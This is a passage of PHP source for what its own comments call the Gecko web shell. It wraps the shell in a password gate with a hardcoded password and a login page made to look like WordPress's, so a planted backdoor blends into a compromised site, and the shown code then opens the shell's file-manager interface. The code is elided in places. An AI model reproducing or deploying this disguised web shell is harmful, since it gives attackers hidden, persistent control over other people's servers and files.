...
// Defina a senha aqui
define('GECKO_PASSWORD', 'senhafoda');

// Se já estiver autenticado, prossegue
if (!isset($_SESSION['gecko_auth']) || $_SESSION['gecko_auth'] !== true) {
    // Se for uma requisição POST com a senha correta
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['gecko_password']) && $_POST['gecko_password'] === GECKO_PASSWORD) {
    ...
    // Caso contrário, exibe a página de login estilo WordPress
    ?>
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        ...
        <title>Acessar &lsaquo; WordPress</title>
        <style>
            body {
                background: #f1f1f1;
        ...
        <div class="login-container">
            <div class="logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="84" height="84">
                    ...
                    <text x="50" y="58" text-anchor="middle" fill="#fff" font-size="32" font-family="sans-serif" font-weight="bold">W</text>
                </svg>
            </div>
            <h1>WordPress</h1>
            <form method="post" action="">
                <input type="text" name="gecko_username" placeholder="Usuário" value="admin" readonly disabled style="background:#f0f0f0;">
                <input type="password" name="gecko_password" placeholder="Senha" required autofocus>
                <input type="submit" value="Acessar">
            </form>
            <?php if (isset($_POST['gecko_password']) && $_POST['gecko_password'] !== GECKO_PASSWORD && $_SERVER['REQUEST_METHOD'] === 'POST') : ?>
                <div class="error">ERRO: Senha incorreta.</div>
            <?php endif; ?>
            <p style="margin-top:15px; font-size:12px; color:#999;">&larr; Voltar para <a href="https://wordpress.org/" style="color:#2271b1; text-decoration:none;">WordPress.org</a></p>
        </div>
    </body>
    </html>
    <?php
    exit; // Impede a execução do webshell
}
// ========== FIM DA PROTEÇÃO ==========

// ------------------ CÓDIGO ORIGINAL DO GECKO (SEM ALTERAÇÕES) ------------------
@set_time_limit(0);
@clearstatcache();
...
<body>
    ...
    <div class="menu-file-manager">
        ...
        <div class="path-pwd">
            <?php
            $cwd = str_replace("\\", "/", $get_cwd); // para dir garis windows
            $pwd = explode("/", $cwd);
